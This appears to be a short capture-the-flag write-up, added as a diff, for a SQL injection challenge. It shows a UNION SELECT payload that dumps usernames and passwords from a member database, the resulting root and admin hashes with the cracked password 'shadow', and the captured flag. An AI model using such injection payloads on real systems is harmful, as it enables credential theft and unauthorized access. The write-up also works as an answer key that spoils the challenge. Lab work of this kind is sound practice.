@@ -1,0 +1,12 @@
+(cf. same process sql injection on members)
+
+1 AND 1=2 UNION SELECT username,password FROM Member_Brute_Force.db_default:
+
+root  3bf1114a986ba87ed28fc1b5884fc2f8 (shadow)
+admin 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow)
+
+Sign in with either of those (i.e. username: root pwd: shadow):
+get the flag:
+b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
+
+
